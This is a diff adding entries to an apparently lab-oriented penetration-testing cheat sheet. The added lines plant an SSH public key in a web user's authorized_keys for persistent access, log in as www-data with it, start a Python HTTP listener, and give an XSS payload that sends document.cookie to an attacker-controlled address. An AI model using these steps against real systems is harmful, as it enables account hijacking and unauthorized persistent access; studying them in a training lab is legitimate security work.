@@ -109,13 +109,31 @@ nikto v -h <IP address>
 ```
 > use with TCPdump.
 
+## website exploitation commands
+```
+mkdir /var/www/directory/.ssh
+cat ~/.ssh/id_rsa.pub
+echo "your_public_key_here" >> /users/home/directory/.ssh/authorized_keys
+cat /users/home/directory/.ssh/authorized_keys
+```
+## ssh with keys
+```
+ssh -i .ssh/id_rsa -MS /tmp/demo www-data@10.50.28.11
+```
+## making your own HTTP server 
+```
+python3 -m http.server
+```
+> default port 8000
 
-
-
-
-
-
-
+## XSS check
+```
+<script>alert('XSS');</script>
+```
+## Other XSS useful command
+```
+<script>document.location="http://10.50.30.229:8000/?username=student" + document.cookie;</script>
+```
 
 
 
